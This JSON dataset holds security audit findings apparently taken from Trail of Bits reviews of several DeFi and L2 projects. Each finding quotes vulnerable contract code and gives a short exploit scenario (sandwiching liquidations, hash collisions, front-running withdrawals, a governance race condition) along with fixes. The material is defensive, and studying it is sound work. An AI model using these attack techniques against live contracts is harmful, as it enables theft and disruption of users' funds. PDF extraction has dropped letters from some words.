[{"title": "8. Problematic use of primitive operations on xed-point integers ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The protocols use of primitive operations over xed-point signed and unsigned integers increases the risk of overows and undened behavior. The Increment Protocol uses the PRBMathSD59x18 and PRBMathUD60x18 math libraries to perform operations over 59x18 signed integers and 60x18 unsigned integers, respectively (specically to perform multiplication and division and to nd their absolute values). These libraries aid in calculations that involve percentages or ratios or require decimal precision. When a smart contract system relies on primitive integers and xed-point ones, it should avoid arithmetic operations that involve the use of both types. For example, using x.wadMul(y) to multiply two xed-point integers will provide a dierent result than using x * y . For that reason, great care must be taken to dierentiate between variables that are xed-point and those that are not. Calculations involving xed-point values should use the provided library operations; calculations involving both xed-point and primitive integers should be avoided unless one type is converted to the other. However, a number of multiplication and division operations in the codebase use both primitive and xed-point integers. These include those used to calculate the new time-weighted average prices (TWAPs) of index and market prices (gure 8.1). function _updateTwap () internal { uint256 currentTime = block.timestamp ; int256 timeElapsed = (currentTime - globalPosition.timeOfLastTrade).toInt256(); /* */ priceCumulative1 = priceCumulative0 + price1 * timeElapsed // will overflow in ~3000 years // update cumulative chainlink price feed int256 latestChainlinkPrice = indexPrice(); oracleCumulativeAmount += latestChainlinkPrice * timeElapsed ; // update cumulative market price feed int256 latestMarketPrice = marketPrice().toInt256(); marketCumulativeAmount += latestMarketPrice * timeElapsed ; uint256 timeElapsedSinceBeginningOfPeriod = block.timestamp - globalPosition.timeOfLastTwapUpdate; if (timeElapsedSinceBeginningOfPeriod >= twapFrequency) { /* */ TWAP = (priceCumulative1 - priceCumulative0) / timeElapsed // calculate chainlink twap oracleTwap = ((oracleCumulativeAmount - oracleCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // calculate market twap marketTwap = ((marketCumulativeAmount - marketCumulativeAmountAtBeginningOfPeriod) / timeElapsedSinceBeginningOfPeriod.toInt256()).toInt128() ; // reset cumulative amount and timestamp oracleCumulativeAmountAtBeginningOfPeriod = oracleCumulativeAmount; marketCumulativeAmountAtBeginningOfPeriod = marketCumulativeAmount; globalPosition.timeOfLastTwapUpdate = block.timestamp .toUint64(); emit TwapUpdated(oracleTwap, marketTwap); } } Figure 8.1: The _updateTwap function in Perpetual.sol#L1071-1110 Similarly, the _getUnrealizedPnL function in the Perpetual contract calculates the tradingFees value by multiplying a primitive and a xed-point integer (gure 8.2). function _getUnrealizedPnL(LibPerpetual.TraderPosition memory trader) internal view returns ( int256 ) { int256 oraclePrice = indexPrice(); int256 vQuoteVirtualProceeds = int256 (trader.positionSize).wadMul(oraclePrice); int256 tradingFees = (vQuoteVirtualProceeds.abs() * market.out_fee().toInt256()) / CURVE_TRADING_FEE_PRECISION; // @dev: take upper bound on the trading fees // in the case of a LONG, trader.openNotional is negative but vQuoteVirtualProceeds is positive // in the case of a SHORT, trader.openNotional is positive while vQuoteVirtualProceeds is negative return int256 (trader.openNotional) + vQuoteVirtualProceeds - tradingFees; } Figure 8.2: The _getUnrealizedPnL function in Perpetual.sol#L1175-1183 These calculations can lead to unexpected overows or cause the system to enter an undened state. Note that there are other such calculations in the codebase that are not documented in this nding. Recommendations Short term, identify all state variables that are xed-point signed or unsigned integers. Additionally, ensure that all multiplication and division operations involving those state variables use the wadMul and wadDiv functions, respectively. If the Increment Finance team decides against using wadMul or wadDiv in any of those operations (whether to optimize gas or for another reason), it should provide inline documentation explaining that decision.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "9. Liquidations are vulnerable to sandwich attacks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Token swaps that are performed to liquidate a position use a hard-coded zero as the minimum-amount-out value, making them vulnerable to sandwich attacks. The minimum-amount-out value indicates the minimum amount of tokens that a user will receive from a swap. The value is meant to provide protection against pool illiquidity and sandwich attacks. Senders of position and liquidity provision updates are allowed to specify a minimum amount out. However, the minimum-amount-out value used in liquidations of both traders and liquidity providers positions is hard-coded to zero. Figures 9.1 and 9.2 show the functions that perform these liquidations ( _liquidateTrader and _liquidateLp , respectively). function _liquidateTrader( uint256 idx, address liquidatee, uint256 proposedAmount ) internal returns ( int256 pnL, int256 positiveOpenNotional) { (positiveOpenNotional) = int256 (_getTraderPosition(idx, liquidatee).openNotional).abs(); LibPerpetual.Side closeDirection = _getTraderPosition(idx, liquidatee).positionSize >= 0 ? LibPerpetual.Side.Short : LibPerpetual.Side.Long; // (liquidatee, proposedAmount) (, , pnL, ) = perpetuals[idx].changePosition(liquidatee, proposedAmount, 0 , closeDirection, true ); // traders are allowed to reduce their positions partially, but liquidators have to close positions in full if (perpetuals[idx].isTraderPositionOpen(liquidatee)) revert ClearingHouse_LiquidateInsufficientProposedAmount(); return (pnL, positiveOpenNotional); } Figure 9.1: The _liquidateTrader function in ClearingHouse.sol#L522-541 function _liquidateLp ( uint256 idx , address liquidatee , uint256 proposedAmount ) internal returns ( int256 pnL , int256 positiveOpenNotional ) { positiveOpenNotional = _getLpOpenNotional(idx, liquidatee).abs(); // close lp (pnL, , ) = perpetuals[idx].removeLiquidity( liquidatee, _getLpLiquidity(idx, liquidatee), [ uint256 ( 0 ), uint256 ( 0 )] , proposedAmount, 0 , true ); _distributeLpRewards(idx, liquidatee); return (pnL, positiveOpenNotional); } Figure 9.2: The _liquidateLp function in ClearingHouse.sol#L543-562 Without the ability to set a minimum amount out, liquidators are not guaranteed to receive any tokens from the pool during a swap. If a liquidator does not receive the correct amount of tokens, he or she will be unable to close the position, and the transaction will revert; the revert will also prolong the Increment Protocols exposure to debt. Moreover, liquidators will be discouraged from participating in liquidations if they know that they may be subject to sandwich attacks and may lose money in the process. Exploit Scenario Alice, a liquidator, notices that a position is no longer valid and decides to liquidate it. When she sends the transaction, the protocol sets the minimum-amount-out value to zero. Eves sandwich bot identies Alices liquidation as a pure prot opportunity and sandwiches it with transactions. Alices liquidation fails, and the protocol remains in a state of debt. Recommendations Short term, allow liquidators to specify a minimum-amount-out value when liquidating the positions of traders and liquidity providers. Long term, document all cases in which front-running may be possible, along with the implications of front-running for the codebase.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "10. Accuracy of market and oracle TWAPs is tied to the frequency of user interactions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "The oracle and market TWAPs can be updated only during traders and liquidity providers interactions with the protocol; a downtick in user interactions will result in less accurate TWAPs that are more susceptible to manipulation. The accuracy of a TWAP is related to the number of data points available for the average price calculation. The less often prices are logged, the less robust the TWAP becomes. In the case of the Increment Protocol, a TWAP can be updated with each block that contains a trader or liquidity provider interaction. However, during a market slump (i.e., a time of reduced network trac), there will be fewer user interactions and thus fewer price updates. TWAP updates are performed by the Perpetual._updateTwap function, which is called by the internal Perpetual._updateGlobalState function. Other protocols, though, take a dierent approach to keeping markets up to date. The Compound Protocol, for example, has an accrueInterest function that is called upon every user interaction but is also a standalone public function that anyone can call. Recommendations Short term, create a public updateGlobalState function that anyone can call to internally call _updateGlobalState . Long term, create an o-chain worker that can alert the team to periods of perpetual market inactivity, ensuring that the team knows to update the market accordingly. 11. Liquidations of short positions may fail because of insu\u0000cient dust collection Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-INC-11 Target: contracts/Perpetual.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "12. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Although dependency scans did not identify a direct threat to the project under review, yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details the high-severity vulnerabilities: CVE ID", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "13. Risks associated with oracle outages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-incrementprotocol-securityreview.pdf", "body": "Under extreme market conditions, the Chainlink oracle may cease to work as expected, causing unexpected behavior in the Increment Protocol. Such oracle issues have occurred in the past. For example, during the LUNA market crash, the Venus protocol was exploited because Chainlink stopped providing up-to-date prices. The interruption occurred because the price of LUNA dropped below the minimum price ( minAnswer ) allowed by the LUNA / USD price feed on the BNB chain. As a result, all oracle updates reverted. Chainlinks automatic circuit breakers , which pause price feeds during extreme market conditions, could pose similar problems. Note that these kinds of events cannot be tracked on-chain. If a price feed is paused, updatedAt will still be greater than zero, and answeredInRound will still be equal to roundID . Thus, the Increment Finance team should implement an o-chain monitoring solution to detect any anomalous behavior exhibited by Chainlink oracles. The monitoring solution should check for the following conditions and issue alerts if they occur, as they may be indicative of abnormal market events:    An asset price that is approaching the minAnswer or maxAnswer value The suspension of a price feed by an automatic circuit breaker Any large deviations in the price of an asset References    Chainlink: Risk Mitigation Chainlink: Monitoring Data Feeds Chainlink: Circuit Breakers", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Attacker can prevent L2 transactions from being added to a block ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "The commitTransactions function returns a ag that determines whether to halt transaction production, even if the block has room for more transactions to be added. If the circuit checker returns an error either for row consumption being too high or reasons unknown, the circuitCapacityReached ag is set to true (gure 1.1). case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && tx.IsL1MessageTx()): // Circuit capacity check: L1MessageTx row consumption too high, shift to the next from the account, // because we shouldn't skip the entire txs from the same account. // This is also useful for skipping \"problematic\" L1MessageTxs. queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"row consumption overflow\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && !tx.IsL1MessageTx()): // Circuit capacity check: L2MessageTx row consumption too high, skip the account. // This is also useful for skipping \"problematic\" L2MessageTxs. log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String()) // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L1MessageTx, // shift to the next from the account because we shouldn't skip the entire txs from the same account queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Unknown circuit capacity checker error for L1MessageTx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"unknown row consumption error\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && !tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L2MessageTx, skip the account log.Trace(\"Unknown circuit capacity checker error for L2MessageTx\", \"tx\", tx.Hash().String()) // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop Figure 1.1: Error handling for the circuit capacity checker (worker.go#L1073-L1121) When this ag is set to true, no new transactions will be added even if there is room for additional transactions in the block (gure 1.2). // Fill the block with all available pending transactions. pending := w.eth.TxPool().Pending(true) // Short circuit if there is no available pending transactions. // But if we disable empty precommit already, ignore it. Since // empty block is necessary to keep the liveness of the network. if len(pending) == 0 && pendingL1Txs == 0 && atomic.LoadUint32(&w.noempty) == 0 { w.updateSnapshot() return } // Split the pending transactions into locals and remotes localTxs, remoteTxs := make(map[common.Address]types.Transactions), pending for _, account := range w.eth.TxPool().Locals() { if txs := remoteTxs[account]; len(txs) > 0 { delete(remoteTxs, account) localTxs[account] = txs } } var skipCommit, circuitCapacityReached bool if w.chainConfig.Scroll.ShouldIncludeL1Messages() && len(l1Txs) > 0 { log.Trace(\"Processing L1 messages for inclusion\", \"count\", pendingL1Txs) txs := types.NewTransactionsByPriceAndNonce(w.current.signer, l1Txs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(localTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, localTxs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(remoteTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, remoteTxs, header.BaseFee) // don't need to get `circuitCapacityReached` here because we don't have further `commitTransactions` // after this one, and if we assign it won't take effect (`ineffassign`) skipCommit, _ = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } // do not produce empty blocks if w.current.tcount == 0 { return } w.commit(uncles, w.fullTaskHook, true, tstart) Figure 1.2: Pending transactions are not added if the circuit capacity has been reached. (worker.go#L1284-L1332) Exploit Scenario Eve, an attacker, sends an L2 transaction that uses ecrecover many times. The transaction is provided to the mempool with enough gas to be the rst L2 transaction in the blockchain. Because this causes an error in the circuit checker, it prevents all other L2 transactions from being executed in this block. Recommendations Short term, implement a snapshotting mechanism in the circuit checker to roll back unexpected changes made as a result of incorrect or incomplete computation. Long term, analyze and document all impacts of error handling across the system to ensure that these errors are handled gracefully. Additionally, clearly document all expected invariants of how the system is expected to behave to ensure that in interactions with other components, these invariants hold throughout the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Unused and dead code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "Due to the infrastructure setup of this network and the use of a single node clique setup, this fork of geth contains a signicant amount of unused logic. Continuing to maintain this code can be problematic and may lead to issues. The following are examples of unused and dead code:  Uncle blockswith a single node clique network, there is no chance for uncle blocks to exist, so all the logic that handles and interacts with uncle blocks can be dropped.  Redundant logic around updating the L1 queue index  A redundant check on empty blocks in the worker.go le Recommendations Short term, remove anything that is no longer relevant for the current go-etheruem implementation and be sure to document all the changes to the codebase. Long term, remove all unused code from the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. Lack of documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "Certain areas of the codebase lack documentation, high-level descriptions, and examples, which makes the contracts dicult to review and increases the likelihood of user mistakes. Areas that would benet from being expanded and claried in code and documentation include the following:  Internals of the CCC. Despite being treated as a black box, the code relies on stateful changes made from geth calls. This suggests that the internal states of the miner's work and the CCC overlap. The lack of documentation regarding these states creates a lack of visibility in evaluating whether there are potential state corruptions or unexpected behavior.  Circumstances where transactions are skipped and how they are expected to be handled. During the course of the review, we attempted to reverse engineer the intended behavior of transactions considered skipped by the CCC. The lack of documentation in these areas results in unclear expectations for this code.  Error handling standard throughout the system. The codebase handles system errors dierentlyin some cases, logging an error and continuing execution or logging traces. Listing out all instances where errors are identied and documenting how they are handled can help ensure that there is no unexpected behavior related to error handling. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. In addition to external documentation, NatSpec and inline code comments could help clarify complexities. Long term, consider writing a formal specication of the protocol. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Publish-subscribe protocol users are vulnerable to a denial of service ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The API3 system implements a publish-subscribe protocol through which a requester can receive a callback from an API when specied conditions are met. These conditions can be hard-coded when the Airnode is congured or stored on-chain. When they are stored on-chain, the user can call storeSubscription to establish other conditions for the callback (by specifying parameters and conditions arguments of type bytes ). The arguments are then used in abi.encodePacked , which could result in a subscriptionId collision. function storeSubscription( [...] bytes calldata parameters, bytes calldata conditions, [...] ) external override returns ( bytes32 subscriptionId) { [...] subscriptionId = keccak256 ( abi .encodePacked( chainId, airnode, templateId, parameters , conditions , relayer, sponsor, requester, fulfillFunctionId ) ); subscriptions[subscriptionId] = Subscription({ chainId: chainId, airnode: airnode, templateId: templateId, parameters: parameters, conditions: conditions, relayer: relayer, sponsor: sponsor, requester: requester, fulfillFunctionId: fulfillFunctionId }); Figure 1.1: StorageUtils.sol#L135-L158 The Solidity documentation includes the following warning: If you use keccak256(abi.encodePacked(a, b)) and both a and b are dynamic types, it is easy to craft collisions in the hash value by moving parts of a into b and vice-versa. More specically, abi.encodePacked(\"a\", \"bc\") == abi.encodePacked(\"ab\", \"c\"). If you use abi.encodePacked for signatures, authentication or data integrity, make sure to always use the same types and check that at most one of them is dynamic. Unless there is a compelling reason, abi.encode should be preferred. Figure 1.2: The Solidity documentation details the risk of a collision caused by the use of abi.encodePacked with more than one dynamic type. Exploit Scenario Alice calls storeSubscription to set the conditions for a callback from a specic API to her smart contract. Eve, the owner of a competitor protocol, calls storeSubscription with the same arguments as Alice but moves the last byte of the parameters argument to the beginning of the conditions argument. As a result, the Airnode will no longer report API results to Alices smart contract. Recommendations Short term, use abi.encode instead of abi.encodePacked . Long term, carefully review the Solidity documentation , particularly the Warning sections regarding the pitfalls of abi.encodePacked .", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The API3 contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the API3 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Decisions to opt out of a monetization scheme are irreversible ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The API3 protocol implements two on-chain monetization schemes. If an Airnode owner decides to opt out of a scheme, the Airnode will not receive additional token payments or deposits (depending on the scheme). Although the documentation states that Airnodes can opt back in to a scheme, the current implementation does not allow it. /// @notice If the Airnode is participating in the scheme implemented by /// the contract: /// Inactive: The Airnode is not participating, but can be made to /// participate by a mantainer /// Active: The Airnode is participating /// OptedOut: The Airnode actively opted out, and cannot be made to /// participate unless this is reverted by the Airnode mapping(address => AirnodeParticipationStatus) public override airnodeToParticipationStatus; Figure 3.1: RequesterAuthorizerWhitelisterWithToken.sol#L59-L68 /// @notice Sets Airnode participation status /// @param airnode Airnode address /// @param airnodeParticipationStatus Airnode participation status function setAirnodeParticipationStatus( address airnode, AirnodeParticipationStatus airnodeParticipationStatus ) external override onlyNonZeroAirnode(airnode) { if (msg.sender == airnode) { require( airnodeParticipationStatus == AirnodeParticipationStatus.OptedOut, \"Airnode can only opt out\" ); } else { [...] Figure 3.2: RequesterAuthorizerWhitelisterWithToken.sol#L229-L242 Exploit Scenario Bob, an Airnode owner, decides to temporarily opt out of a scheme, believing that he will be able to opt back in; however, he later learns that that is not possible and that his Airnode will be unable to accept any new requesters. Recommendations Short term, adjust the setAirnodeParticipationStatus function to allow Airnodes that have opted out of a scheme to opt back in. Long term, write extensive unit tests that cover all of the expected pre- and postconditions. Unit tests could have uncovered this issue.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "4. Depositors can front-run request-blocking transactions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "A depositor can front-run a request-blocking transaction and withdraw his or her deposit. The RequesterAuthorizerWhitelisterWithTokenDeposit contract enables a user to indenitely whitelist a requester by depositing tokens on behalf of the requester. A manager or an address with the blocker role can call setRequesterBlockStatus or setRequesterBlockStatusForAirnode with the address of a requester to block that user from submitting requests; as a result, any user who deposited tokens to whitelist the requester will be blocked from withdrawing the deposit. However, because one can execute a withdrawal immediately, a depositor could monitor the transactions and call withdrawTokens to front-run a blocking transaction. Exploit Scenario Eve deposits tokens to whitelist a requester. Because the requester then uses the system maliciously, the manager blacklists the requester, believing that the deposited tokens will be seized. However, Eve front-runs the transaction and withdraws the tokens. Recommendations Short term, implement a two-step withdrawal process in which a depositor has to express his or her intention to withdraw a deposit and the funds are then unlocked after a waiting period. Long term, analyze all possible front-running risks in the system.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. Incompatibility with non-standard ERC20 tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The RequesterAuthorizerWhitelisterWithTokenPayment and RequesterAuthorizerWhitelisterWithTokenDeposit contracts are meant to work with any ERC20 token. However, several high-prole ERC20 tokens do not correctly implement the ERC20 standard. These include USDT, BNB, and OMG, all of which have a large market cap. The ERC20 standard denes two transfer functions, among others:  transfer(address _to, uint256 _value) public returns (bool success)  transferFrom(address _from, address _to, uint256 _value) public returns (bool success) These high-prole ERC20 tokens do not return a boolean when at least one of the two functions is executed. As of Solidity 0.4.22, the size of return data from external calls is checked. As a result, any call to the transfer or transferFrom function of an ERC20 token with an incorrect return value will fail. Exploit Scenario Bob deploys the RequesterAuthorizerWhitelisterWithTokenPayment contract with USDT as the token. Alice wants to pay for a requester to be whitelisted and calls payTokens , but the transferFrom call fails. As a result, the contract is unusable. Recommendations Short term, consider using the OpenZeppelin SafeERC20 library or adding explicit support for ERC20 tokens with incorrect return values. Long term, adhere to the token integration best practices outlined in appendix C .", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "6. Compromise of a single oracle enables limited control of the dAPI value ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "By compromising only one oracle, an attacker could gain control of the median price of a dAPI and set it to a value within a certain range. The dAPI value is the median of all values provided by the oracles. If the number of oracles is odd (i.e., the median is the value in the center of the ordered list of values), an attacker could skew the median, setting it to a value between the lowest and highest values submitted by the oracles. Exploit Scenario There are three available oracles: O 0 , with a price of 603; O 1 , with a price of 598; and O 2 , which has been compromised by Eve. Eve is able to set the median price to any value in the range [598 , 603] . Eve can then turn a prot by adjusting the rate when buying and selling assets. Recommendations Short term, be mindful of the fact that there is no simple x for this issue; regardless, we recommend implementing o-chain monitoring of the DapiServer contracts to detect any suspicious activity. Long term, assume that an attacker may be able to compromise some of the oracles. To mitigate a partial compromise, ensure that dAPI value computations are robust.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "7. Project dependencies contain vulnerabilities ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The execution of yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repositories under review. The output below details these issues. CVE ID", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "8. DapiServer beacon data is accessible to all users ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The lack of access controls on the conditionPspDapiUpdate function could allow an attacker to read private data on-chain. The dataPoints[] mapping contains private data that is supposed to be accessible on-chain only by whitelisted users. However, any user can call conditionPspDapiUpdate , which returns a boolean that depends on arithmetic over dataPoint : /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters /// @dev This method does not allow the caller to indirectly read a dAPI, /// which is why it does not require the sender to be a void signer with /// zero address. [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 8.1: dapis/DapiServer.sol:L468-L502 An attacker could abuse this function to deduce one bit of data per call (to determine, for example, whether a users account should be liquidated). An attacker could also automate the process of accessing one bit of data to extract a larger amount of information by using a mechanism such as a dichotomic search. An attacker could therefore infer the value of dataPoin t directly on-chain. Exploit Scenario Eve, who is not whitelisted, wants to read a beacon value to determine whether a certain users account should be liquidated. Using the code provided in appendix E , she is able to conrm that the beacon value is greater than or equal to a certain threshold. Recommendations Short term, implement access controls to limit who can call conditionPspDapiUpdate . Long term, document all read and write operations related to dataPoint , and highlight their access controls. Additionally, consider implementing an o-chain monitoring system to detect any suspicious activity.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "9. Misleading function name ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/API3.pdf", "body": "The conditionPspDapiUpdate function always updates the dataPoints storage variable (by calling updateDapiWithBeacons ), even if the function returns false (i.e., the condition for updating the variable is not met). This contradicts the code comment and the behavior implied by the functions name. /// @notice Returns if the respective dAPI needs to be updated based on the /// condition parameters [...] function conditionPspDapiUpdate( bytes32 subscriptionId, // solhint-disable-line no-unused-vars bytes calldata data, bytes calldata conditionParameters ) external override returns (bool) { bytes32 dapiId = keccak256(data); int224 currentDapiValue = dataPoints[dapiId].value; require( dapiId == updateDapiWithBeacons(abi.decode(data, (bytes32[]))), \"Data length not correct\" ); return calculateUpdateInPercentage( currentDapiValue, dataPoints[dapiId].value ) >= decodeConditionParameters(conditionParameters); } Figure 9.1: dapis/DapiServer.sol#L468-L502 Recommendations Short term, revise the documentation to inform users that a call to conditionPspDapiUpdate will update the dAPI even if the function returns false . Alternatively, develop a function similar to updateDapiWithBeacons that returns the updated value without actually updating it. Long term, ensure that functions names reect the implementation.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "1. Race condition in FraxGovernorOmega target validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-05-fraxgov-securityreview.pdf", "body": "The FraxGovernorOmega contract is intended for carrying out day-to-day operations and less sensitive proposals that do not adjust system governance parameters. Proposals directly aecting system governance are managed in the FraxGovernorAlpha contract, which has a much higher quorum requirement (40%, compared with FraxGovernorOmega s 4% quorum requirement). When a new proposal is submitted to the FraxGovernorOmega contract through the propose or addTransaction function, the target address of the proposal is checked to prevent proposals from interacting with sensitive functions in allowlisted safes outside of the higher quorum ow (gure 1.1). However, if a proposal to allowlist a new safe is pending in FraxGovernorAlpha , and another proposal that interacts with the pending safe is preemptively submitted through FraxGovernorOmega.propose , the proposal would pass this check, as the new safe would not yet have been added to the allowlist. /// @notice The ```propose``` function is similar to OpenZeppelin's ```propose()``` with minor changes /// @dev Changes include: Forbidding targets that are allowlisted Gnosis Safes /// @return proposalId Proposal ID function propose ( address [] memory targets, uint256 [] memory values, bytes [] memory calldatas, string memory description ) public override returns ( uint256 proposalId ) { _requireSenderAboveProposalThreshold(); for ( uint256 i = 0 ; i < targets.length; ++i) { address target = targets[i]; // Disallow allowlisted safes because Omega would be able to call safe.approveHash() outside of the // addTransaction() / execute() / rejectTransaction() flow if ($safeRequiredSignatures[target] != 0 ) { revert IFraxGovernorOmega.DisallowedTarget(target); } } Figure 1.1: The target validation logic in the FraxGovernorOmega contracts propose function This issue provides a short window of time in which a proposal to update governance parameters that is submitted through FraxGovernorOmega could pass with the contracts 4% quorum, rather than needing to go through FraxGovernorAlpha and its 40% quorum, as intended. Such an exploit would also require cooperation from the safe owners to execute the approved transaction. As the vast majority of operations in the FraxGovernorOmega process will be optimistic proposals, the community may not monitor the contract as comprehensively as FraxGovernorAlpha , and a minority group of coordinated veFXS holders could take advantage of this loophole. Exploit Scenario A FraxGovernorAlpha proposal to add a new Gnosis Safe to the allowlist is being voted on. In anticipation of the proposals approval, the new safe owner prepares and signs a transaction on this new safe for a contentious or previously vetoed action. Alice, a veFXS holder, uses FraxGovernorOmega.propose to initiate a proposal to approve the hash of this transaction in the new safe. Alice coordinates with enough other interested veFXS holders to reach the required quorum on the proposal. The proposal passes, and the new safe owner is able to update governance parameters without the consensus of the community. Recommendations Short term, add additional validation to the end of the proposal lifecycle to detect whether the target has become an allowlisted safe. Long term, when designing new functionality, consider how this type of time-of-check to time-of-use mismatch could aect the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Vulnerable project dependency ", 